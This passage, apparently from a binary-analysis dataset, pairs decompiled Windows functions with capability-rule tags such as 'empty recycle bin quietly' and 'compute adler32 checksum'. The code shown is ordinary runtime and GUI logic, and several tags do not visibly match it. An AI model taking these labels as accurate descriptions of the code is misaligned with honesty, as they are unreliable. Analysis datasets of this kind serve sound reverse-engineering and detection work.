        "decompiled_code": "\nvoid fcn.0041bd99(uint32_t param_1, char *param_2, uint32_t param_3)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t iStack1060;\n    int32_t iStack1056;\n    int32_t iStack1052;\n    char *pcStack1048;\n    int32_t iStack1044;\n    int32_t iStack1040;\n    char acStack1036 [1028];\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    iStack1052 = 0;\n    iStack1056 = 0;\n    if (param_3 == 0) goto code_r0x0041bf53;\n    piVar1 = (param_1 >> 5) * 4 + 0x4685e0;\n    iVar8 = (param_1 & 0x1f) * 0x24;\n    if ((*(*piVar1 + 4 + iVar8) & 0x20) != 0) {\n        fcn.004200cb(param_1, 0, 0, 2);\n    }\n    if ((*(*piVar1 + iVar8 + 1) & 0x80) == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)(*(*piVar1 + iVar8), param_2, param_3, &iStack1060, 0);\n        if (iVar5 == 0) {\n            iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            iStack1040 = 0;\n            iStack1052 = iStack1060;\n        }\ncode_r0x0041beb5:\n        if (iStack1052 != 0) goto code_r0x0041bf53;\n        if (iStack1040 != 0) {\n            if (iStack1040 == 5) {\n                puVar6 = fcn.004131f5();\n                *puVar6 = 9;\n                puVar6 = fcn.004131fe();\n                *puVar6 = 5;\n            }\n            else {\n                fcn.00413207(iStack1040);\n            }\n            goto code_r0x0041bf53;\n        }\n    }\n    else {\n        pcStack1048 = param_2;\n        iStack1040 = 0;\n        if (param_3 != 0) {\n            do {\n                uVar7 = pcStack1048 - param_2;\n                pcVar4 = acStack1036;\n                iStack1044 = 0;\n                do {\n                    if (param_3 <= uVar7) break;\n                    pcVar3 = pcStack1048 + 1;\n                    cVar2 = *pcStack1048;\n                    uVar7 = uVar7 + 1;\n                    if (cVar2 == '\\n') {\n                        iStack1056 = iStack1056 + 1;\n                        *pcVar4 = '\\r';\n                        pcVar4 = pcVar4 + 1;\n                        iStack1044 = iStack1044 + 1;\n                    }\n                    *pcVar4 = cVar2;\n                    pcVar4 = pcVar4 + 1;\n                    iStack1044 = iStack1044 + 1;\n                    pcStack1048 = pcVar3;\n                } while (iStack1044 < 0x400);\n                iVar5 = (*_sym.imp.KERNEL32.dll_WriteFile)\n                                  (*(*piVar1 + iVar8), acStack1036, pcVar4 - acStack1036, &iStack1060, 0);\n                if (iVar5 == 0) {\n                    iStack1040 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    goto code_r0x0041beb5;\n                }\n                iStack1052 = iStack1052 + iStack1060;\n                if ((iStack1060 < pcVar4 - acStack1036) || (param_3 <= pcStack1048 - param_2)) goto code_r0x0041beb5;\n            } while( true );\n        }\n    }\n    if (((*(*piVar1 + 4 + iVar8) & 0x40) == 0) || (*param_2 != '\\x1a')) {\n        puVar6 = fcn.004131f5();\n        *puVar6 = 0x1c;\n        puVar6 = fcn.004131fe();\n        *puVar6 = 0;\n    }\ncode_r0x0041bf53:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1058
    },
    "0042082b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042082b(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n        arg_10h = 10;\n    }\n    else {\n        uVar1 = 0;\n    }\n    fcn.004207ed(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 115
    },
    "00420855": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420855(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((arg_10h == 10) && (arg_8h < 0)) {\n        uVar1 = 1;\n    }\n    fcn.004207ed(arg_10h, uVar1);\n    return arg_ch;\n}\n",
        "token_count": 100
    },
    "00435469": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nint32_t __cdecl\nfcn.00435469(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_ch;\n    uint var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x435473;\n    fcn.004118b0();\n    iVar3 = *(unaff_EBP + 0xc);\n    iVar4 = 0;\n    *(unaff_EBP + -0x10) = &fcn.00435469::var_1ch;\n    *(unaff_EBP + -0x1c) = extraout_ECX;\n    if (iVar3 < 0) {\n        iVar3 = -iVar3;\n    }\n    iVar2 = *(unaff_EBP + 8);\n    if (iVar2 == 0) {\n        iVar2 = 0;\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        for (; *(unaff_EBP + -0x18) = iVar4,  iVar4 < iVar3; iVar4 = iVar4 + 1) {\n            var_1ch = unaff_EBP + -0x11;\n            fcn.0040dbd9();\n            cVar1 = *(unaff_EBP + -0x11);\n            if (cVar1 == '\\n') {\ncode_r0x004354c7:\n                if (*(unaff_EBP + 0xc) != iVar3) {\n                    *(iVar4 + iVar2) = cVar1;\n                    iVar4 = iVar4 + 1;\n                }\n                break;\n            }\n            if (cVar1 == '\\r') {\n                fcn.0040dbd9(unaff_EBP + -0x11);\n                cVar1 = *(unaff_EBP + -0x11);\n                goto code_r0x004354c7;\n            }\n            *(iVar4 + iVar2) = cVar1;\n        }\n        *(iVar4 + iVar2) = 0;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 642
    },
    "0043cf9d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043cf9d(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint uVar4;\n    uint lprcDst;\n    uint lprcSrc1;\n    int32_t lprcSrc2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = arg_8h - *(in_ECX + 4);\n    iVar3 = arg_ch - *(in_ECX + 8);\n    iVar2 = *(in_ECX + 0x8c);\n    uVar4 = 2;\n    if (iVar2 == 10) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + iVar1;\n    }\n    else {\n        if (iVar2 != 0xb) {\n            uVar4 = 0x22;\n            if (iVar2 == 0xc) {\n                *(in_ECX + 0x2c) = *(in_ECX + 0x2c) + iVar3;\n            }\n            else {\n                *(in_ECX + 0x34) = *(in_ECX + 0x34) + iVar3;\n            }\n            iVar2 = *(in_ECX + 0x34) - *(in_ECX + 0x2c);\n            goto code_r0x0043cff5;\n        }\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + iVar1;\n    }\n    iVar2 = *(in_ECX + 0x30) - *(in_ECX + 0x28);\ncode_r0x0043cff5:\n    if (iVar2 < 0) {\n        iVar2 = 0;\n    }\n    (**(**(in_ECX + 0x68) + 0x134))(&var_8h, iVar2, uVar4);\n    uVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    (*_sym.imp.USER32.dll_GetWindowRect)(uVar4, &lprcSrc1);\n    lprcSrc2 = *(in_ECX + 0x48);\n    var_14h = *(in_ECX + 0x4c);\n    var_10h = *(in_ECX + 0x50);\n    var_ch = *(in_ECX + 0x54);\n    if ((*(in_ECX + 0x8c) == 10) || (*(in_ECX + 0x8c) == 0xc)) {\n        lprcSrc2 = ((var_10h - *(in_ECX + 0x60)) - var_8h) + *(in_ECX + 0x58);\n        var_14h = ((*(in_ECX + 0x5c) - *(in_ECX + 100)) - var_4h) + var_ch;\n        iVar2 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar2 != 0) {\n            *(in_ECX + 0x38) = *(in_ECX + 0x40) - var_8h;\n            *(in_ECX + 0x3c) = *(in_ECX + 0x44) - var_4h;\n            *(in_ECX + 0x48) = lprcSrc2;\n            *(in_ECX + 0x4c) = var_14h;\n        }\n    }\n    else {\n        var_10h = (*(in_ECX + 0x60) - *(in_ECX + 0x58)) + lprcSrc2 + var_8h;\n        var_ch = (*(in_ECX + 100) - *(in_ECX + 0x5c)) + var_14h + var_4h;\n        iVar2 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcDst, &lprcSrc1, &lprcSrc2);\n        if (iVar2 != 0) {\n            *(in_ECX + 0x40) = *(in_ECX + 0x38) + var_8h;\n            *(in_ECX + 0x44) = *(in_ECX + 0x3c) + var_4h;\n            *(in_ECX + 0x50) = var_10h;\n            *(in_ECX + 0x54) = var_ch;\n        }\n    }\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    fcn.0043cd91(0);\n    return;\n}\n",
        "token_count": 1088
    },
    "004420ee": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t fcn.004420ee(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    \n    pcVar1 = param_3 + param_1;\n    pcVar2 = param_2 + param_1;\n    if (pcVar1 < pcVar2) {\n        do {\n            if (*pcVar1 != '\\r') break;\n            pcVar1 = pcVar1 + 1;\n        } while (pcVar1 < pcVar2);\n        if ((pcVar1 < pcVar2) && (*pcVar1 == '\\n')) {\n            pcVar1 = pcVar1 + 1;\n        }\n    }\n    return pcVar1 - param_1;\n}\n",
        "token_count": 172
    },
    "004134e4": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.004134e4(uint32_t *arg_8h)\n\n{\n    uint32_t *arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    bool bVar4;\n    int64_t iVar5;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar3 = arg_8h[1];\n    if (((uVar3 < 0) || (0x1000 < uVar3)) || ((0xfff < uVar3 && (*arg_8h != 0)))) {\n        arg_8h_00 = NULL;\n    }\n    else {\n        fcn.0041abf2();\n        uVar3 = arg_8h[1];\n        uVar2 = *arg_8h;\n        if ((uVar3 < 0) || ((uVar3 < 1 && (uVar2 < 0x3f481)))) {\n            arg_8h_00 = fcn.0041a3e6(arg_8h);\n            if ((*0x464804 == 0) || (iVar1 = fcn.0041ac73(arg_8h_00),  iVar1 == 0)) {\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - *0x464800;\n                var_4h = ((uVar3 >> 0x1f) - (*0x464800 >> 0x1f)) - (uVar3 < *0x464800);\n            }\n            else {\n                uVar2 = *0x464800 + *0x464808;\n                uVar3 = *arg_8h_00;\n                var_8h = uVar3 - uVar2;\n                var_4h = ((uVar3 >> 0x1f) - (uVar2 >> 0x1f)) - (uVar3 < uVar2);\n                arg_8h_00[8] = 1;\n            }\n            uVar3 = fcn.0041acc0(var_8h, var_4h, 0x3c, 0);\n            *arg_8h_00 = uVar3;\n            if (uVar3 < 0) {\n                *arg_8h_00 = uVar3 + 0x3c;\n                bVar4 = 0x3b < var_8h;\n                var_8h = var_8h - 0x3c;\n                var_4h = var_4h + -1 + bVar4;\n            }\n            _var_8h = fcn.00412930(var_8h, var_4h, 0x3c, 0);\n            _var_8h = _var_8h + arg_8h_00[1];\n            uVar3 = fcn.0041acc0(_var_8h, 0x3c, 0);\n            arg_8h_00[1] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[1] = uVar3 + 0x3c;\n                _var_8h = _var_8h + -0x3c;\n            }\n            iVar5 = fcn.00412930(_var_8h, 0x3c, 0);\n            _var_8h = iVar5 + arg_8h_00[2];\n            uVar3 = fcn.0041acc0(_var_8h, 0x18, 0);\n            arg_8h_00[2] = uVar3;\n            if (uVar3 < 0) {\n                arg_8h_00[2] = uVar3 + 0x18;\n                _var_8h = _var_8h + -0x18;\n            }\n            iVar5 = fcn.00412930(_var_8h, 0x18, 0);\n            iVar1 = iVar5;\n            if ((iVar5 < 0x100000000) && (iVar5 < 0)) {\n                arg_8h_00[6] = (arg_8h_00[6] + 7 + iVar1) % 7;\n                arg_8h_00[3] = arg_8h_00[3] + iVar1;\n                if (arg_8h_00[3] < 1) {\n                    arg_8h_00[5] = arg_8h_00[5] - 1;\n                    arg_8h_00[3] = arg_8h_00[3] + 0x1f;\n                    arg_8h_00[7] = 0x16c;\n                    arg_8h_00[4] = 0xb;\n                }\n                else {\n                    arg_8h_00[7] = arg_8h_00[7] + iVar1;\n                }\n            }\n        }\n        else {\n            var_8h = uVar2 - *0x464800;\n            var_4h = (uVar3 - (*0x464800 >> 0x1f)) - (uVar2 < *0x464800);\n            arg_8h_00 = fcn.0041a3e6(&var_8h);\n            if ((*0x464804 != 0) && (iVar1 = fcn.0041ac73(arg_8h_00),  iVar1 != 0)) {\n                bVar4 = var_8h < *0x464808;\n                var_8h = var_8h - *0x464808;\n                var_4h = (var_4h - (*0x464808 >> 0x1f)) - bVar4;\n                arg_8h_00 = fcn.0041a3e6(&var_8h);\n                arg_8h_00[8] = 1;\n            }\n        }\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 1344
    },
    "0041c90b": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t fcn.0041c90b(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = *0x464bf0;\n    iVar9 = 0;\n    var_4h = NULL;\n    do {\n        iVar2 = fcn.00411cb0(*(var_4h * 4 + 0x1c + iVar1));\n        iVar3 = fcn.00411cb0(*(var_4h * 4 + iVar1));\n        var_4h = var_4h + 1;\n        iVar9 = iVar3 + iVar9 + 2 + iVar2;\n    } while (var_4h < 7);\n    var_ch = iVar1 + 0x38;\n    var_8h = 0xc;\n    do {\n        iVar2 = fcn.00411cb0(var_ch[0xc]);\n        iVar3 = fcn.00411cb0(*var_ch);\n        var_ch = var_ch + 1;\n        var_8h = var_8h + -1;\n        iVar9 = iVar3 + iVar9 + 2 + iVar2;\n    } while (var_8h != NULL);\n    iVar2 = fcn.00411cb0(*(iVar1 + 0x98));\n    iVar3 = fcn.00411cb0(*(iVar1 + 0x9c));\n    iVar4 = fcn.00411cb0(*(iVar1 + 0xa0));\n    iVar5 = fcn.00411cb0(*(iVar1 + 0xa4));\n    iVar6 = fcn.00411cb0(*(iVar1 + 0xa8));\n    iVar9 = fcn.0041101f(iVar3 + iVar9 + iVar2 + iVar4 + iVar5 + iVar6 + 0xbd);\n    if (iVar9 != 0) {\n        iVar2 = iVar9 + 0xb8;\n        fcn.00411970(iVar9, *0x464bf0, 0xb8);\n        var_4h = NULL;\n        var_8h = iVar1 + 0x1c;\n        do {\n            *(iVar9 + var_4h * 4) = iVar2;\n            uVar7 = fcn.004190f0(iVar2, var_8h[-7]);\n            iVar3 = fcn.00411cb0(uVar7);\n            iVar3 = iVar2 + 1 + iVar3;\n            *((iVar9 - iVar1) + var_8h) = iVar3;\n            uVar7 = fcn.004190f0(iVar3, *var_8h);\n            iVar2 = fcn.00411cb0(uVar7);\n            var_8h = var_8h + 1;\n            var_4h = var_4h + 1;\n            iVar2 = iVar3 + 1 + iVar2;\n        } while (var_4h < 7);\n        var_4h = iVar9 + 0x68;\n        puVar8 = iVar1 + 0x38;\n        var_10h = 0xc;\n        do {\n            *(puVar8 + (iVar9 - iVar1)) = iVar2;\n            uVar7 = fcn.004190f0(iVar2, *puVar8);\n            iVar3 = fcn.00411cb0(uVar7);\n            iVar3 = iVar2 + 1 + iVar3;\n            *var_4h = iVar3;\n            uVar7 = fcn.004190f0(iVar3, puVar8[0xc]);\n            iVar2 = fcn.00411cb0(uVar7);\n            puVar8 = puVar8 + 1;\n            var_4h = var_4h + 1;\n            var_10h = var_10h + -1;\n            iVar2 = iVar3 + 1 + iVar2;\n        } while (var_10h != 0);\n        *(iVar9 + 0x98) = iVar2;\n        uVar7 = fcn.004190f0(iVar2, *(iVar1 + 0x98));\n        iVar3 = fcn.00411cb0(uVar7);\n        iVar3 = iVar2 + 1 + iVar3;\n        *(iVar9 + 0x9c) = iVar3;\n        uVar7 = fcn.004190f0(iVar3, *(iVar1 + 0x9c));\n        iVar2 = fcn.00411cb0(uVar7);\n        iVar2 = iVar3 + 1 + iVar2;\n        *(iVar9 + 0xa0) = iVar2;\n        uVar7 = fcn.004190f0(iVar2, *(iVar1 + 0xa0));\n        iVar3 = fcn.00411cb0(uVar7);\n        iVar3 = iVar2 + 1 + iVar3;\n        *(iVar9 + 0xa4) = iVar3;\n        uVar7 = fcn.004190f0(iVar3, *(iVar1 + 0xa4));\n        iVar2 = fcn.00411cb0(uVar7);\n        iVar2 = iVar3 + 1 + iVar2;\n        *(iVar9 + 0xa8) = iVar2;\n        fcn.004190f0(iVar2, *(iVar1 + 0xa8));\n    }\n    return iVar9;\n}\n",
        "token_count": 1256
    },
    "0044828d": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044828d(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00444bf8();\n    uVar1 = *(iVar2 + 0xc);\n    iVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar1, arg_8h, 0xf1);\n    if (((iVar2 != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar1, iVar2),  iVar2 != 0)) &&\n       (iVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(iVar2),  iVar3 != 0)) {\n        arg_8h_00 = fcn.0042eabb(*(iVar3 + 6) << 2);\n        iVar4 = 0;\n        if (*(iVar3 + 6) != 0) {\n            puVar5 = iVar3 + 8;\n            do {\n                *(arg_8h_00 + iVar4 * 4) = *puVar5;\n                iVar4 = iVar4 + 1;\n                puVar5 = puVar5 + 1;\n            } while (iVar4 < *(iVar3 + 6));\n        }\n        iVar4 = fcn.00447e23(arg_8h_00, *(iVar3 + 6));\n        fcn.0042eae6(arg_8h_00);\n        if (iVar4 != 0) {\n            fcn.0044809d(*(iVar3 + 2) + 7, *(iVar3 + 4) + 7, *(iVar3 + 2), *(iVar3 + 4));\n            iVar4 = fcn.00448187(arg_8h);\n        }\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar2);\n        return iVar4;\n    }\n    return 0;\n}\n",
        "token_count": 465
    },
    "0041b3a6": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b3a6(uint16_t *arg_8h, uint32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_18h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = arg_8h[5];\n    var_ch = *(arg_8h + 3);\n    var_8h = *(arg_8h + 1);\n    var_4h = *arg_8h << 0x10;\n    uVar5 = uVar1 & 0x7fff;\n    iVar6 = uVar5 - 0x3fff;\n    if (iVar6 == -0x3fff) {\n        iVar6 = 0;\n        uVar5 = fcn.0041b312();\n        uVar2 = uVar5;\n        if (uVar5 != 0) {\ncode_r0x0041b4be:\n            uVar3 = 0;\n            goto code_r0x0041b4c0;\n        }\n    }\n    else {\n        fcn.0041b2eb(&var_18h, &var_ch);\n        iVar4 = fcn.0041b279(&var_ch, arg_10h[2]);\n        if (iVar4 != 0) {\n            iVar6 = uVar5 - 0x3ffe;\n        }\n        iVar4 = arg_10h[1];\n        if (iVar6 < iVar4 - arg_10h[2]) {\n            var_ch = 0;\n            var_8h = 0;\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n        else {\n            if (iVar4 < iVar6) {\n                if (*arg_10h <= iVar6) {\n                    var_8h = 0;\n                    var_4h = 0;\n                    var_ch = 0x80000000;\n                    fcn.0041b32b(&var_ch, arg_10h[3]);\n                    iVar6 = arg_10h[5] + *arg_10h;\n                    uVar3 = 1;\n                    goto code_r0x0041b4c0;\n                }\n                var_ch = var_ch & 0x7fffffff;\n                iVar6 = arg_10h[5] + iVar6;\n                fcn.0041b32b(&var_ch, arg_10h[3]);\n                goto code_r0x0041b4be;\n            }\n            fcn.0041b2eb(&var_ch, &var_18h);\n            fcn.0041b32b(&var_ch, iVar4 - iVar6);\n            fcn.0041b279(&var_ch, arg_10h[2]);\n            fcn.0041b32b(&var_ch, arg_10h[3] + 1);\n            uVar5 = var_ch;\n            uVar2 = var_8h;\n        }\n    }\n    var_8h = uVar2;\n    var_ch = uVar5;\n    iVar6 = 0;\n    uVar3 = 2;\ncode_r0x0041b4c0:\n    var_ch = iVar6 << (0x1fU - arg_10h[3] & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_ch;\n    if (arg_10h[4] == 0x40) {\n        arg_ch[1] = var_ch;\n        *arg_ch = var_8h;\n    }\n    else if (arg_10h[4] == 0x20) {\n        *arg_ch = var_ch;\n    }\n    return uVar3;\n}\n",
        "token_count": 878
    },
    "0041b52a": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b52a(uint16_t *arg_8h, uint *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = arg_8h[5];\n    var_10h = *(arg_8h + 3);\n    var_ch = *(arg_8h + 1);\n    var_8h = *arg_8h << 0x10;\n    uVar3 = uVar1 & 0x7fff;\n    iVar2 = fcn.0041b279(&var_10h, 0x40);\n    if (iVar2 != 0) {\n        var_10h = 0x80000000;\n        uVar3 = uVar3 + 1;\n    }\n    if (uVar3 == 0x7fff) {\n        var_4h = 1;\n    }\n    arg_ch[1] = var_10h;\n    *(arg_ch + 2) = uVar1 & 0x8000 | uVar3;\n    *arg_ch = var_ch;\n    return var_4h;\n}\n",
        "token_count": 295
    },
    "00424425": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00424425(int32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_18h;\n    uint var_10h;\n    uint32_t lpPoint;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    puVar3 = arg_ch;\n    puVar4 = &var_24h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_24h = (*_sym.imp.USER32.dll_SendMessageA)(*(arg_8h + 0x1c), 0x410, 0, &var_10h);\n    lpPoint = arg_ch[5];\n    var_4h = arg_ch[6];\n    if ((0x1ff < var_20h) && (var_20h < 0x20a)) {\n        (*_sym.imp.USER32.dll_ScreenToClient)(var_24h, &lpPoint);\n    }\n    var_18h = lpPoint & 0xffff | var_4h << 0x10;\n    (*pcVar1)(*(arg_8h + 0x1c), 0x407, 0, &var_24h);\n    return;\n}\n",
        "token_count": 370
    },
    "00438a43": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00438a43(int32_t arg_8h, uint32_t lpPoint, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    while( true ) {\n        (*_sym.imp.USER32.dll_ScreenToClient)(arg_8h, &lpPoint);\n        iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0x366, 0, lpPoint & 0xffff | arg_10h << 0x10);\n        (*_sym.imp.USER32.dll_ClientToScreen)(arg_8h, &lpPoint);\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_8h, 0xfffffff0);\n        if (((uVar2 & 0x40000000) == 0) || (arg_8h = (*_sym.imp.USER32.dll_GetParent)(arg_8h),  arg_8h == 0)) break;\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n    }\n    if (iVar1 != 0) {\n        return iVar1;\n    }\n    return -1;\n}\n",
        "token_count": 267
    },
    "0043a24f": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043a24f(uint arg_8h)\n\n{\n    uint var_18h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0043a1ad(arg_8h, &var_18h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 88
    },
    "0043a373": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0043a373(uint arg_8h, uint *arg_ch, uint32_t *arg_10h, uint *arg_14h)\n\n{\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0043a1ad(arg_8h, &var_18h);\n    *arg_ch = var_14h;\n    *arg_10h = var_10h << 0x10 | var_10h._1_1_;\n    *arg_14h = var_18h;\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 173
    },
    "0044113a": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044113a(int32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_ECX;\n    uint32_t uVar7;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x11);\n    if (iVar2 < 0) {\n        uVar7 = 8;\n    }\n    else {\n        uVar7 = 0;\n    }\n    iVar2 = (*pcVar1)(0x10);\n    if (iVar2 < 0) {\n        uVar3 = 4;\n    }\n    else {\n        uVar3 = 0;\n    }\n    iVar4 = (*_sym.imp.USER32.dll_GetFocus)();\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    if (iVar4 == 0) {\n        iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x20a, arg_8h << 0x10 | uVar7 | uVar3, arg_ch);\n    }\n    else {\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_SendMessageA)(iVar4, 0x20a, arg_8h << 0x10 | uVar7 | uVar3, arg_ch);\n            iVar4 = (*_sym.imp.USER32.dll_GetParent)(iVar4);\n            if (iVar6 != 0) {\n                return iVar6;\n            }\n            if (iVar4 == 0) {\n                return 0;\n            }\n        } while (iVar4 != iVar5);\n    }\n    return iVar6;\n}\n",
        "token_count": 420
    },
    "0044809d": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044809d(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar2 = (*_sym.imp.USER32.dll_IsWindow)(*(in_ECX + 0x1c));\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (iVar2 == 0) {\n        *(in_ECX + 0xa8) = arg_8h;\n        *(in_ECX + 0xac) = arg_ch;\n        *(in_ECX + 0xa0) = arg_10h;\n        *(in_ECX + 0xa4) = arg_14h;\n    }\n    else {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x420, 0, arg_10h & 0xffff | arg_14h << 0x10);\n        (*pcVar1)(*(in_ECX + 0x1c), 0x41f, 0, arg_8h & 0xffff | arg_ch << 0x10);\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), 0, 1);\n    }\n    return;\n}\n",
        "token_count": 313
    },
    "0042ed3a": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
